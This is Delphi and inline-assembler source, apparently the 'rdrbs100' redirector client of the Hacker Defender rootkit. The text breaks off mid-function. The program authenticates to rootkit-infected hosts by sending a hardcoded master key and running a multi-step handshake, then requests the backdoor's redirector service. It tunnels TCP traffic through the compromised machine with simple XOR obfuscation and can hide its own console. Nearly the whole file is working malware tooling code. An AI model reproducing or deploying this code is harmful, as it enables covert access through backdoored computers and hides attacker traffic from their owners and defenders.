program rdrbs100;
{$APPTYPE CONSOLE}
uses Windows,USysUtils,ShellAPI,Winsock2,UList,UTCP;

{$R rdrbs100.res}

const
 WindowClassName='hxdef-rdrbase-100';
 WM_QUIT                = $0012;
 WM_LBUTTONDBLCLK       = $0203;
 WM_USER                = $0400;
 WM_TRAYNOTIFY          = WM_USER+1;
 WM_TRAY_END            = WM_TRAYNOTIFY+1;
 WM_HIDECONSOLE         = WM_TRAY_END+1;
 WM_MAX                 = WM_USER+10;

 MaxMappedPorts         = 1000;
 ptUnknown              = 0;
 ptNormal               = 1;
 ptHTTP                 = 2;

 WAITFOREVENTSTIMEOUT=250;
 SOCK_ADDR_SIZE=SizeOf(TSockAddrIn);

 MASTER_KEY_LEN=32;

 BSC_INIT_REQ_1             =$E0;
 BSC_INIT_RES_1             =$E1;
 BSC_INIT_REQ_2             =$E2;
 BSC_INIT_RES_2             =$E3;
 BSC_INIT_REQ_3             =$E4;
 BSC_INIT_RES_3             =$E5;
 BSC_INIT_COMPLETE          =$E6;
 BSC_CONSOLE_INPUT          =$E7;
 BSC_CONSOLE_OUTPUT         =$E8;
 BSC_AUTHORIZATION_OK       =$E9;
 BSC_AUTHORIZATION_FAILED   =$EA;
 BSC_SERVICE_BACKDOOR       =$EB;
 BSC_SERVICE_REDIRECTOR     =$EC;
 BSC_SERVICE_TEST_REQ       =$ED;
 BSC_SERVICE_TEST_RES       =$EE;
 BSC_END_REQ                =$EF;

type
 TCommand=record
  Name,Info,Usage:string;
 end;
const
 CommandsCount=19;
 CommandList:array[1..CommandsCount] of TCommand=
 (
 (Name:'HELP';Info:'List of commands or command details.';Usage:' [COMMAND]'),
 (Name:'EXIT';Info:'Kill this application. Use DIS flag to discard unsaved data.';Usage:' [DIS]'),
 (Name:'CLS';Info:'Clear screen buffer.';Usage:''),
 (Name:'SAVE';Info:'Save settings.';Usage:''),
 (Name:'LIST';Info:'List mapped ports.';Usage:' [PAGE INDEX]'),
 (Name:'OPEN';Info:'Open mapped port.';Usage:' <INDEX>'),
 (Name:'CLOSE';Info:'Close mapped port.';Usage:' <INDEX>'),
 (Name:'HIDE';Info:'Hide this console. (NT Only)';Usage:''),
 (Name:'MPINFO';Info:'Show number of mapped and open ports.';Usage:''),
 (Name:'ADD';Info:'Create mapped port. You have to specify domain when using HTTP type.';Usage:' <LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET SERVER PORT> <PASSWORD> [TYPE] [DOMAIN]'),
 (Name:'DEL';Info:'Delete mapped port.';Usage:' <INDEX>'),
 (Name:'DETAIL';Info:'More info about mapped port.';Usage:' <INDEX>'),
 (Name:'SULIST';Info:'List startup commands.';Usage:' [PAGE INDEX]'),
 (Name:'SUADD';Info:'Add startup command.';Usage:' <INDEX>'),
 (Name:'SUDEL';Info:'Delete startup command.';Usage:' <INDEX>'),
 (Name:'SILENT';Info:'Display or change silent mode.';Usage:' [ON|OFF]'),
 (Name:'EDIT';Info:'Edit mapped port.';Usage:' <INDEX>'),
 (Name:'SUEDIT';Info:'Edit startup command.';Usage:' [ON|OFF]'),
 (Name:'TEST';Info:'Test mapping server.';Usage:' <INDEX>')
 );

type
 TCharInfoEx=record
  case Byte of
   0:(UnicodeChar:WCHAR;
      UAttributes:Word);
   1:(AsciiChar:CHAR;
      AAttributes:Word);
 end;

 TConsoleScreen=array[0..24,0..79] of TCharInfoEx;
 TSettings=record
  SilentMode:Boolean;
 end;
 PMappedPort=^TMappedPort;
 TMappedPort=record
//  ID:array[0..3] of Char;
  LocalListenPort:Word;
  MappingServer:TInAddr;
  MappingServerPort:Word;
  TargetServer:TInAddr;
  TargetServerPort:Word;
  AuthNum:Cardinal;
  Password:array[0..15] of Char;
  PortType:Word;
  Domain:string;
  Opened:Longbool;
 end;
 PStartupItem=^TStartupItem;
 TStartupItem=array[0..1023] of Char;

 TWindowsVersion=(wvUnknown,wvWin32s,wvWindowsNT40,wvWindows95,wvWindows95OSR2,wvWindows98,wvWindows98SE,wvWindows2000,wvWindowsMe,wvWindowsXP);
 TWindowsType=(wtUnknown,wtWin32s,wtWxx,wtNT);

var
 NotifyIconData:TNotifyIconData;
 WindowClass:TWndClass;
 Icon:HICON;
 IsConsole,ReadThreadExists,AppRun,ReadThreadSuspened,IniLoaded,SilentNow:Boolean;
 ConsoleScreenBuffer:TConsoleScreen;
 ConsoleCursorInfo:TConsoleCursorInfo;
 ConsoleScreenBufferInfo:TConsoleScreenBufferInfo;
 WindowHandle,InputHandle,OutputHandle,ReadThreadHandle:THandle;
 FirstCoords,SecondCoords:TCoord;
 FirstRect:TSmallRect;
 IniFile:string;
 Settings:TSettings;
 MappedPorts,StartupList:TList;
 Msg:TMsg;
 WSAData:TWSAData;
 WindowsVersion:TWindowsVersion;
 WindowsType:TWindowsType;
 MasterKey:array[0..MASTER_KEY_LEN-1] of Char=#$01#$9A#$8C#$66#$AF#$C0#$4A#$11
                                             +#$9E#$3F#$40#$88#$12#$2C#$3A#$4A
                                             +#$84#$65#$38#$B0#$B4#$08#$0B#$AF
                                             +#$DB#$CE#$02#$94#$34#$5F#$22#$00;

procedure ReplaceHostInHTTPPacket(var VBuffer:Pointer;var VSize:Cardinal;ADomain:Pointer);stdcall;
var
 LBuf,LNew,LDom:string;
 LPos:Integer;
begin
 LDom:=string(ADomain);
 SetLength(LBuf,VSize);
 CopyMemory(Pointer(LBuf),VBuffer,VSize);
 LPos:=Pos(#$0D#$0A+'HOST: ',UpCase(LBuf));
 if LPos>0 then
 begin
  LNew:=Copy(LBuf,1,LPos+7)+LDom;
  LBuf:=Copy(LBuf,LPos+7,MaxInt);
  LPos:=Pos(#$0D#$0A,LBuf);
  if LPos>0 then LNew:=LNew+Copy(LBuf,LPos,MaxInt);
  LocalFree(Cardinal(VBuffer));
  VSize:=Length(LNew);
  VBuffer:=Pointer(LocalAlloc(LMEM_FIXED,VSize));
  CopyMemory(VBuffer,Pointer(LNew),VSize);
 end;
end;

procedure AddRedir(AListenPort:Cardinal;AMappingAddr:TInAddr;AMappingPort:Cardinal;ATerminator:Pointer;ATargetServer:TInAddr;ATargetPort:Cardinal;APortType:Cardinal;ADomain:Pointer;AAuthNum:Cardinal); stdcall; assembler;
asm
 push dword ptr [ebp+028h]
 push dword ptr [ebp+024h]
 push dword ptr [ebp+020h]
 push dword ptr [ebp+01Ch]
 push dword ptr [ebp+018h]

 push dword ptr [ebp+014h]
 mov eax,[ebp+010h]
 shl eax,010h
 mov ax,[ebp+008h]
 push eax
 push dword ptr [ebp+00Ch]
 call @Server
 leave
 ret 024h
 @Server:
  push ebp
  mov ebp,esp
  sub esp,034h
  {
   -030        -       NewClient.Host.sin_family:Word
   -02E        -       NewClient.Host.sin_port:Word
   -02C        -       NewClient.Host.sin_addr:TInAddr
   -028..-024  -       NewClient.Host.sin_zero:array[0..7] of Char
   -020        -       NewClient.Socket:TSocket
   -01C        -       TID:Cardinal;
   -018        -       ServerEventHandle:THandle
   -014        -       ServerHost.sin_family:Word
   -012        -       ServerHost.sin_port:Word
   -010        -       ServerHost.sin_addr:TInAddr
   -00C..-008  -       ServerHost.sin_zero:array[0..7] of Char
   -004        -       ServerSocket:TSocket
   +008        -       MappingServerAddr:TInAddr
   +00C        -       ListenPort:Word
   +00E        -       MappingServerPort:Word
   +010        -       Terminator:PBoolean
   +014        -       TargetServerAddr:TInAddr
   +018        -       TargetServerPort:Cardinal
   +01C        -       PortType:Carindal
   +020        -       PortDomain:string
   +024        -       AuthNum:Cardinal
  }
  push esi
  push edi
  push ebx

  xor eax,eax
  mov [ebp-010h],eax
  push eax
  push eax
  push eax
  push IPPROTO_TCP
  push SOCK_STREAM
  push AF_INET
  call WSASocket
  mov [ebp-004h],eax
  inc eax
  jz @Server_end

  mov eax,[ebp+00Ch]
  xchg ah,al
  mov [ebp-012h],ax
  mov word ptr [ebp-014h],AF_INET

  push 010h
  lea eax,[ebp-014h]
  push eax
  push dword ptr [ebp-004h]
  call bind
  inc eax
  jz @Server_end
  push SOMAXCONN
  push dword ptr [ebp-004h]
  call listen
  jnz @Server_end
 @Server_loop:
  lea eax,[ebp-018h]
  push eax
  push [ebp-004h]
  call @EventSelect
  test eax,eax
  jz @Server_end
  push [ebp-018h]
  push [ebp-004h]
  call @WaitForEvents
  test eax,eax
  jnz @Server_proc_events
  mov eax,[ebp+010h]
  mov eax,[eax]
  test eax,eax
  jz @Server_end
  push 019h
  call Sleep
  jmp @Server_loop
 @Server_proc_events:
  and eax,FD_ACCEPT
  jz @Server_loop
  xor eax,eax
  push eax
  push eax
  push eax
  lea eax,[ebp-030h]
  push eax
  push dword ptr [ebp-004h]
  call WSAAccept
  mov [ebp-020h],eax
  inc eax
  jz @Server_loop
  push 030h
  push LMEM_FIXED
  call LocalAlloc
  test eax,eax
  jz @Server_close_newsock
  mov ecx,[ebp-020h]
  mov [eax],ecx
  lea esi,[ebp-030h]
  lea edi,[eax+004h]
  movsd
  movsd
  movsd
  movsd
  lea esi,[ebp+008h]
  movsd
  movsd
  add esi,004h
  push 005h
  pop ecx
  rep movsd

  lea edx,[ebp-01Ch]
  push edx
  push ecx
  push eax
  push offset @NewClientThread
  push ecx
  push ecx
  call CreateThread
  jmp @Server_loop
 @Server_close_newsock:
  push dword ptr [ebp-020h]
  call CloseSocket
  jmp @Server_loop
 @Server_end:
  push 050h
  call Sleep
  mov eax,[ebp+010h]
  push 000h
  pop dword ptr [eax]
  push dword ptr [ebp-018h]
  call WSACloseEvent
  push dword ptr [ebp-004h]
  call CloseSocket
  leave
  ret 008h

 @EventSelect:
  call WSACreateEvent
  test eax,eax
  jz @EventSelect_fail
  mov ecx,[esp+008h]
  mov [ecx],eax

  push FD_ALL_EVENTS
  push eax
  push [esp+00Ch]
  call WSAEventSelect
  inc eax
  jnz @EventSelect_end
 @EventSelect_fail:
  xor eax,eax
 @EventSelect_end:
  ret 008h

 @WaitForEvents:
  push ebp
  mov ebp,esp
  sub esp,02Ch

  //LFucker
{  push 0109h                     //Lfucker
  call Sleep                    //Lfucker}

  call @PeekMessages

{ @WaitForEvents_PM_loop:
  push PM_REMOVE
  push 000h
  push 000h
  push 000h
  lea eax,[ebp-02Ch]
  push eax
  call PeekMessageA
  test eax,eax
  jnz @WaitForEvents_PM_loop}
  //LFucker

  push 000h
  push WAITFOREVENTSTIMEOUT
  push 000h
  lea eax,[ebp+00Ch]
  push eax
  push 1
  call WSAWaitForMultipleEvents
  inc eax
  jz @WaitForEvents_end
  sub eax,WSA_WAIT_TIMEOUT+1
  jz @WaitForEvents_end
  lea eax,[ebp-02Ch]
  push eax
  push dword ptr [ebp+00Ch]
  push dword ptr [ebp+008h]
  call WSAEnumNetworkEvents
  inc eax
  jz @WaitForEvents_end
  mov eax,[ebp-02Ch]
 @WaitForEvents_end:
  leave
  jmp @EventSelect_end

 @NewClientThread:
  mov ebp,esp
  sub esp,070h
  {
   -070        -       RedirThreadHandle:THandle
   -06C        -       ClientThreadHandle:THandle
   -068        -       Redir.ThreadArgs.MainItem:PTcpItem
   -064        -       Redir.ThreadArgs.OtherItem:PTcpItem
   -060        -       Redir.ThreadArgs.ThreadType:Cardinal
   -05C        -       Redir.ThreadArgs.Events:Longint
   -058        -       Redir.ThreadArgs.EventHandle:THandle
   -054        -       Redir.ThreadArgs.Active:Boolean
   -050        -       Redir.ThreadArgs.Host.sin_family:Word
   -04E        -       Redir.ThreadArgs.Host.sin_port:Word
   -04C        -       Redir.ThreadArgs.Host.sin_addr:TInAddr
   -048..-044  -       Redir.ThreadArgs.Host.sin_zero:array[0..7] of Char
   -040        -       Redir.ThreadArgs.Socket
   -038        -       Redir.ThreadID:Cardinal
   -034        -       Client.ThreadArgs.MainItem:PTcpItem
   -030        -       Client.ThreadArgs.OtherItem:PTcpItem
   -02C        -       Client.ThreadArgs.ThreadType:Cardinal
   -028        -       Client.ThreadArgs.Events:Longint
   -024        -       Client.ThreadArgs.EventHandle:THandle
   -020        -       Client.ThreadArgs.Active:Boolean
   -01C        -       Client.ThreadArgs.Host.sin_family:Word
   -01A        -       Client.ThreadArgs.Host.sin_port:Word
   -018        -       Client.ThreadArgs.Host.sin_addr:TInAddr
   -014..-010  -       Client.ThreadArgs.Host.sin_zero:array[0..7] of Char
   -00C        -       Client.ThreadArgs.Socket
   -008        -       Client.ThreadArgs.Connected
   -004        -       Client.ThreadID:Cardinal
   +004        -       AArgs:Pointer
               +000    AArgs.NewSocket
               +004    AArgs.NewHost.sin_family:Word
               +006    AArgs.NewHost.sin_port:Word
               +008    AArgs.NewHost.sin_addr:TInAddr
               +00C..+010    AArgs.NewHost.sin_zero:array[0..7] of Char
               +014    AArgs.MappingServerAddr:TInAddr
               +018    AArgs.ListenPort:Word
               +01A    AArgs.MappingServerPort:Word
               +01C    AArgs.TargetServerAddr
               +020    AArgs.TargetServerPort
               +024    AArgs.PortType
               +028    AArgs.Domain
               +02C    AArgs.AuthNum
  }

  xor eax,eax
  lea edi,[ebp-070h]
  push 01Ch
  pop ecx
  rep stosd

  push eax
  push eax
  push eax
  push IPPROTO_TCP
  push SOCK_STREAM
  push AF_INET
  call WSASocket
  mov [ebp-00Ch],eax
  inc eax
  jz @NewClientThread_close_newsock

  push 001h
  pop eax
  mov [ebp-020h],eax
  mov [ebp-054h],eax
  mov [ebp-060h],eax

  mov edx,[ebp+004h]
  movzx eax,word ptr [edx+01Ah]
  xchg ah,al
  mov [ebp-01Ah],ax
  mov word ptr [ebp-01Ch],AF_INET
  mov eax,[edx+014h]
  mov [ebp-018h],eax
  mov eax,[edx]
  mov [ebp-040h],eax
  lea esi,[edx+004h]
  lea edi,[ebp-050h]
  movsd
  movsd
  movsd
  movsd

  lea eax,[ebp-058h]
  push eax
  push dword ptr [ebp-040h]
  call @EventSelect
  test eax,eax
  jz @NewClientThread_close_clientsock

  lea eax,[ebp-068h]
  mov [ebp-030h],eax
  mov [ebp-068h],eax
  lea eax,[ebp-034h]
  mov [ebp-034h],eax
  mov [ebp-064h],eax

  lea eax,[ebp-004h]
  push eax
  push 000h
  lea eax,[ebp-034h]
  push eax
  push offset @ThreadProc
  push 000h
  push 000h
  call CreateThread
  test eax,eax
  jz @NewClientThread_close_clientsock
  mov [ebp-06Ch],eax

  push 019h
  call Sleep

  lea eax,[ebp-038h]
  push eax
  push 000h
  lea eax,[ebp-068h]
  push eax
  push offset @ThreadProc
  push 000h
  push 000h
  call CreateThread
  test eax,eax
  jz @NewClientThread_term_clientthread
  mov [ebp-070h],eax

  push -001h
  push 000h
  lea eax,[ebp-070h]
  push eax
  push 2
  call WaitForMultipleObjects
  xor eax,eax
  mov [ebp-054h],eax
  mov [ebp-020h],eax
  mov [ebp-008h],eax
  push 032h
  call Sleep

  push dword ptr [ebp-040h]
  call CloseSocket
  push dword ptr [ebp-00Ch]
  call CloseSocket

  push 0FAh
  call Sleep

  push 000h
  push dword ptr [ebp-070h]
  call TerminateThread
 @NewClientThread_term_clientthread:
  push 000h
  push dword ptr [ebp-06Ch]
  call TerminateThread
 @NewClientThread_close_clientsock:
  push dword ptr [ebp-00Ch]
  call CloseSocket

  push dword ptr [ebp-058h]
  call CloseHandle
  push dword ptr [ebp-024h]
  call CloseHandle

 @NewClientThread_close_newsock:
  mov eax,[ebp+004h]
  push dword ptr [eax]
  call CloseSocket
  push dword ptr [ebp+004h]
  call LocalFree
  push 000h
  call ExitThread

 @ThreadProc:
  mov ebp,esp
  sub esp,00Ch
 {

   -00C        -       LBuffer:Pointer
   -008        -       LBytes:Cardinal
   -004        -       LSocket:TSocket
   +004        -       AArgs:Pointer
               +000    AArgs.ThreadArgs.MainItem:PTcpItem
               +004    AArgs.ThreadArgs.OtherItem:PTcpItem
               +008    AArgs.ThreadArgs.ThreadType:Cardinal
               +00C    AArgs.ThreadArgs.Events:Longint
               +010    AArgs.ThreadArgs.EventHandle:THandle
               +014    AArgs.ThreadArgs.Active:Boolean
               +018    AArgs.ThreadArgs.Host.sin_family:Word
               +01A    AArgs.ThreadArgs.Host.sin_port:Word
               +01C    AArgs.ThreadArgs.Host.sin_addr:TInAddr
               +020..+024    AArgs.ThreadArgs.Host.sin_zero:array[0..7] of Char
               +028    AArgs.ThreadArgs.Socket
               +02C    AArgs.ThreadArgs.Connected - client only
 }
  mov esi,[ebp+004h]
  mov eax,[esi+008h]
  test eax,eax
  jnz @ThreadProc_redir
  mov eax,[esi+02Ch]
  test eax,eax
  jnz @ThreadProc_client_connected
  push eax
  push eax
  push eax
  push eax
  push SOCK_ADDR_SIZE
  lea eax,[esi+018h]
  push eax
  push dword ptr [esi+028h]
  call WSAConnect
  inc eax
  jz @ThreadProc_error
  lea eax,[esi+010h]
  push eax
  push dword ptr [esi+028h]
  call @EventSelect
//  mov [esi+02Ch],eax
  test eax,eax
  jz @ThreadProc_error

{}
 @ThreadProc_preinit_read:
  push dword ptr [esi+028h]
  call @BytesToRecv
  test eax,eax
  jz @ThreadProc_init_start
  mov edi,eax
  push eax
  push LMEM_FIXED
  call LocalAlloc
  test eax,eax
  jz @ThreadProc_closesock
  mov [ebp-00Ch],eax
  push 000h
  push edi
  push eax
  push dword ptr [esi+028h]
  call recv
  push dword ptr [ebp-00Ch]
  call LocalFree
  jmp @ThreadProc_preinit_read
 @ThreadProc_init_start:
  push 014h
  pop ebx
 @ThreadProc_init_start_send:
  //newfeature modulos
  push esi
  push 003h
  pop esi
  xor edi,edi
  inc edi
 @ThreadProc_init_start_modulos:
  push 015h
  pop eax
  sub eax,ebx
  xor edx,edx
  div esi
  test edx,edx

  setz al
  add edi,eax
  inc esi
  cmp esi,007h
  jb @ThreadProc_init_start_modulos
  pop esi

{  //newfeature nil key
  mov eax,offset MasterNil
  push 000h
  push MASTER_KEY_LEN
  push eax
  push dword ptr [esi+028h]
  call send
  //\newfeature nil key
}
  mov ecx,edi
  xor edi,edi

 @ThreadProc_init_start_send_loop:
  push ecx
  //\newfeature modulos
  mov eax,offset MasterKey
//  xor edi,edi newfeature modulos
  push edi
  push MASTER_KEY_LEN
  push eax
  push dword ptr [esi+028h]
  call send
  pop ecx //newfeature modulos
  loop @ThreadProc_init_start_send_loop //newfeature modulos

  push 009h
  pop edi
 @ThreadProc_wait_for_srvinit:
  dec edi
  jz @ThreadProc_wait_for_srvinit_failed
  push dword ptr [esi+010h]
  push dword ptr [esi+028h]
  call @WaitForEvents
  test eax,eax
  jz @ThreadProc_wait_for_srvinit
  mov ecx,eax
  and eax,FD_READ
  jnz @ThreadProc_srvinit
  and ecx,FD_CLOSE
  jnz @ThreadProc_closesock
  jmp @ThreadProc_wait_for_srvinit
 @ThreadProc_srvinit: 
  lea eax,[ebp-00Ch]
  push 000h
  pop dword ptr [eax]
  push 000h
  push 001h  //newfeature was 004
  push eax
  push dword ptr [esi+028h]
  call recv
  inc eax
  jz @ThreadProc_closesock

  mov eax,[ebp-00Ch]
  cmp eax,BSC_INIT_REQ_1
  jz @ThreadProc_srv_init_1
 //newfeature

  push dword ptr [esi+028h]
  call @BytesToRecv
  test eax,eax
  jz @ThreadProc_wait_for_srvinit_failed
  mov edi,eax
  push eax
  push LMEM_FIXED
  call LocalAlloc
  test eax,eax
  jz @ThreadProc_wait_for_srvinit_failed
  mov [ebp-00Ch],eax
  push 000h
  push edi
  push eax
  push dword ptr [esi+028h]
  call recv
  push dword ptr [ebp-00Ch]
  call LocalFree

 //\newfeature
 @ThreadProc_wait_for_srvinit_failed:
  dec ebx
  jnz @ThreadProc_init_start_send
  jmp @ThreadProc_closesock

 @ThreadProc_srv_init_1:
  push dword ptr [esi+028h]
  call @BytesToRecv
  test eax,eax
  jz @ThreadProc_srv_init_cmp
  mov edi,eax
  push eax
  push LMEM_FIXED
  call LocalAlloc
  test eax,eax
  jz @ThreadProc_closesock
  mov [ebp-00Ch],eax
  push 000h
  push edi
  push eax
  push dword ptr [esi+028h]
  call recv
  push dword ptr [ebp-00Ch]
  call LocalFree
  push 060h
  call Sleep
  jmp @ThreadProc_srv_init_1
 @ThreadProc_srv_init_cmp:
  push 015h
  pop ebx
 @ThreadProc_srv_init_cmp_loop:
  dec ebx
  jz @ThreadProc_closesock
  mov eax,[ebp-00Ch]
  test eax,eax
  jnz @ThreadProc_srv_init_2
  push BSC_INIT_RES_1
  pop dword ptr [ebp-00Ch]
  jmp @ThreadProc_srv_init_send
 @ThreadProc_srv_init_2:
  sub eax,BSC_INIT_REQ_1
  jz @ThreadProc_srv_init_x
  dec eax
  dec eax
  jz @ThreadProc_srv_init_x
  dec eax
  dec eax
  jz @ThreadProc_srv_init_x
  dec eax
  dec eax
  jz @ThreadProc_srv_init_sucend
  jmp @ThreadProc_closesock
 @ThreadProc_srv_init_x:
  inc dword ptr [ebp-00Ch]
 @ThreadProc_srv_init_send:
  push 000h
  push 001h
  lea eax,[ebp-00Ch]
  push eax
  push dword ptr [esi+028h]
  call send

  push 000h
  pop dword ptr [ebp-00Ch]
  push 019h
  pop edi

 @ThreadProc_wait_for_sign:
  dec edi
  jz @ThreadProc_srv_init_cmp_loop

  push dword ptr [esi+010h]
  push dword ptr [esi+028h]
  call @WaitForEvents
  test eax,eax
  jz @ThreadProc_wait_for_sign
  and eax,FD_READ
  jz @ThreadProc_wait_for_sign
  push 000h
  push 001h
  lea eax,[ebp-00Ch]
  push eax
  push dword ptr [esi+028h]
  call recv
  jmp @ThreadProc_srv_init_cmp_loop
 @ThreadProc_srv_init_sucend:
  push 000h
  push 004h
  mov eax,[esi+038h]
  lea eax,[eax+02Ch]
  push eax
  push dword ptr [esi+028h]
  call send

  push 050h
  pop edi
 @ThreadProc_wait_for_auth:
  dec edi
  jz @ThreadProc_closesock
  push 019h
  call Sleep
  push 000h
  push 001h
  lea eax,[ebp-00Ch]
  push eax
  push dword ptr [esi+028h]
  call recv
  inc eax
  jz @ThreadProc_wait_for_auth
  mov eax,[ebp-00Ch]
  cmp eax,BSC_AUTHORIZATION_OK
  jnz @ThreadProc_closesock
  push 000h
  push 001h
  lea eax,[ebp-00Ch]
  mov byte ptr [eax],BSC_SERVICE_REDIRECTOR
  push eax
  push dword ptr [esi+028h]
  call send
  push 000h
  push 008h
  mov eax,[esi+038h]
  lea eax,[eax+01Ch]
  push eax
  push dword ptr [esi+028h]
  call send

  push 001h
  pop dword ptr [esi+02Ch]
  //xxxxxx

  jmp @ThreadProc_client_connected
 @ThreadProc_redir:
  mov edi,[esi+004h]
 @ThreadProc_redir_waitforcon:
  push 019h
  call Sleep
  mov eax,[edi+02Ch]
  test eax,eax
  jz @ThreadProc_redir_waitforcon
 @ThreadProc_client_connected:
  mov eax,[esi+014h]
  test eax,eax
  jz @ThreadProc_closesock
  mov eax,[esi+004h]
  mov eax,[eax+014h]
  test eax,eax
  jz @ThreadProc_closesock

  push dword ptr [esi+010h]
  push dword ptr [esi+028h]
  call @WaitForEvents

  test eax,eax
  jz @ThreadProc_client_connected
  mov [esi+00Ch],eax
  and eax,FD_READ
  jnz @ThreadProc_read
 @ThreadProc_af_read:
  mov eax,[esi+00Ch]
  and eax,FD_CLOSE
  jnz @ThreadProc_closesock
  jmp @ThreadProc_client_connected
 @ThreadProc_read:
  mov eax,[esi+008h]
  test eax,eax
  jz @ThreadProc_decrypt
  //KKK kkk KKKK kkkk
 @ThreadProc_crypt:
  push dword ptr [esi+028h]
  call @BytesToRecv
  test eax,eax
  jz @ThreadProc_af_read

  mov edi,eax
  push eax
  push LMEM_FIXED
  call LocalAlloc
  test eax,eax
  jz @ThreadProc_closesock
  mov [ebp-00Ch],eax
  push 000h
  push edi
  push eax
  push dword ptr [esi+028h]
  call recv
  mov [ebp-008h],eax
  inc eax
  jz @ThreadProc_read_free

  mov ecx,[esi+06Ch]
  mov eax,[ecx+024h]
  dec eax
  dec eax
  jnz @ThreadProc_docrypt
  push dword ptr [ecx+028h]
  lea eax,[ebp-008h]
  push eax
  lea eax,[ebp-00Ch]
  push eax
  call ReplaceHostInHTTPPacket

 @ThreadProc_docrypt:
  mov edi,[ebp-00Ch]
  mov ecx,[ebp-008h]
  mov edx,[esi+06Ch]
  mov edx,[edx+02Ch]
//  jmp @ThreadProc_crypt_done //fucker
  test ecx,ecx
  jz @ThreadProc_read_loop
 @ThreadProc_crypt_loop:
  mov al,[edi]
  xor al,dl
  add al,065h
  stosb
  ror edx,001h
  loop @ThreadProc_crypt_loop
// @ThreadProc_crypt_done: //fucker
  push 000h
  push 004h
  lea eax,[ebp-008h]
  push eax
  mov eax,[esi+004h]
  mov eax,[eax+028h]
  push eax
  call send
  jmp @ThreadProc_read_loop

 @ThreadProc_decrypt:
  push 000h
  push 004h
  lea eax,[ebp-008h]
  push eax
  push dword ptr [esi+028h]
  call recv
  mov edi,[ebp-008h]
  inc eax                                 //breakpoint
  jz @ThreadProc_closesock
(*//bugfix
  mov [ebp-008h],0FABCDEFAh
  push 000h
  push 004h
  lea eax,[ebp-008h]
  push eax
  push dword ptr [esi+028h]
  call send
  mov [ebp-008h],edi
  push 000h
  push 004h
  lea eax,[ebp-008h]
  push eax
  push dword ptr [esi+028h]
  call send
  inc eax
  jz @ThreadProc_closesock
//\bugfix*)
  test edi,edi
  jz @ThreadProc_af_read
  push edi
  push LMEM_FIXED
  call LocalAlloc
  test eax,eax
  jz @ThreadProc_closesock
  mov [ebp-00Ch],eax
  mov [ebp-008h],edi
  mov edx,eax
 @ThreadProc_decrypt_wait:
  push edx
  push dword ptr [esi+010h]
  push dword ptr [esi+028h]
  call @WaitForEvents
  pop edx
  mov [esi+00Ch],eax
  test eax,eax
  jz @ThreadProc_decrypt_wait
  and eax,FD_READ
  jnz @ThreadProc_decrypt_read_buf
 @ThreadProc_decrypt_af_read:
  mov eax,[esi+00Ch]
  and eax,FD_CLOSE
  jnz @ThreadProc_read_free
  jmp @ThreadProc_decrypt_wait
 @ThreadProc_decrypt_read_buf:
  push edx
  push 000h
  push edi
  push edx
  push dword ptr [esi+028h]
  call recv
  pop edx
  inc eax
  jz @ThreadProc_read_free
  dec eax
  add edx,eax
  sub edi,eax
  jnz @ThreadProc_decrypt_af_read

 @ThreadProc_decrypt_buf_read:
  mov edi,[ebp-00Ch]
  mov ecx,[ebp-008h]
  mov edx,[esi+038h]
  mov edx,[edx+02Ch]
//  jmp @ThreadProc_read_loop //fucker
  test ecx,ecx
  jz @ThreadProc_read_free
 @ThreadProc_decrypt_loop:
  mov al,[edi]
  sub al,065h
  xor al,dl
  stosb
  ror edx,001h
  loop @ThreadProc_decrypt_loop
  nop

 @ThreadProc_read_loop:
//bugfixsleep
  push 0FCh
  call Sleep
//\bugfixsleep
  push 000h
  push dword ptr [ebp-008h]
  push dword ptr [ebp-00Ch]
  mov eax,[esi+004h]
  mov eax,[eax+028h]
  push eax
  call send
  inc eax
  jz @ThreadProc_read_free
  dec eax
  sub [ebp-008h],eax
  jnz @ThreadProc_read_loop
 @ThreadProc_read_free:
  push dword ptr [ebp-00Ch]
  call LocalFree
  jmp @ThreadProc_af_read
 @ThreadProc_closesock:
//bugfixsleep
  push 0019h
  call Sleep
//\bugfixsleep

  push dword ptr [esi+028h]
  call CloseSocket            //breakpoint
 @ThreadProc_error:
  push 000h
  call ExitThread

 @BytesToRecv:
  xor eax,eax
  push eax
  push eax
  push eax
  push eax
  lea ecx,[esp+00Ch]
  push ecx
  push 004h
  sub ecx,004h
  push ecx
  push eax
  push eax
  push FIONREAD
  push [esp+02Ch]
  call WSAIoctl
  inc eax
  jz @BytesToRecv_end
  mov eax,[esp]
 @BytesToRecv_end:
  pop ecx
  pop ecx
  ret 004h

 @PeekMessages:
  push ebp
  mov ebp,esp
  sub esp,01Ch
 @PeekMessages_loop:
  push PM_REMOVE
  push 000h
  push 000h
  push 000h
  lea eax,[ebp-01Ch]
  push eax
  call PeekMessageA
  test eax,eax
  jnz @PeekMessages_loop
  push 00Ah
  call Sleep
  leave
  ret

end;

function TestMappingServer(AMappingAddr:TInAddr;AMappingPort:Cardinal;AAuthNum:Cardinal):Boolean;
var
 LTCPClient:TTCPClient;
 LSign:Byte;
 LBuf:array[1..8192] of Char;
 LI:Integer;
begin
 Result:=False;
 try
  LTCPClient:=TTCPClient.Create;
  LTCPClient.SetHost(inet_ntoa(AMappingAddr),AMappingPort);
  with LTCPClient do
  if Connect then
  begin
   while RecvData(@LBuf,SizeOf(LBuf),500)>0 do WaitPoint(100);
   for LI:=1 to 20 do
   begin
    ZeroMemory(@LBuf,SizeOf(LBuf));
//    SendBuffer(LBuf,MASTER_KEY_LEN);
    CopyMemory(@LBuf,@MasterKey[0],MASTER_KEY_LEN);
    SendData(@LBuf,MASTER_KEY_LEN);
    if LI mod 3=0 then SendData(@LBuf,MASTER_KEY_LEN);
    if LI mod 4=0 then SendData(@LBuf,MASTER_KEY_LEN);
    if LI mod 5=0 then SendData(@LBuf,MASTER_KEY_LEN);
    if LI mod 6=0 then SendData(@LBuf,MASTER_KEY_LEN);
    LSign:=0;
    RecvData(@LSign,SizeOf(LSign),2000);
    if LSign=BSC_INIT_REQ_1 then Break;
   end;
   if LSign=BSC_INIT_REQ_1 then
   begin
    while RecvData(@LBuf,SizeOf(LBuf),250)>0 do WaitPoint(100);
    ZeroMemory(@LBuf,SizeOf(LBuf));

    for LI:=1 to 20 do
    begin
     case LSign of
      0:LSign:=BSC_INIT_RES_1;
      BSC_INIT_REQ_1,BSC_INIT_REQ_2,BSC_INIT_REQ_3:Inc(LSign);
      BSC_INIT_COMPLETE:Break;
     end;
     SendData(@LSign,SizeOf(LSign));
     LSign:=0;
     RecvData(@LSign,SizeOf(LSign),5000);
    end;
    if LSign=BSC_INIT_COMPLETE then
    begin
     SendData(@AAuthNum,SizeOf(AAuthNum));
     RecvData(@LSign,SizeOf(LSign));
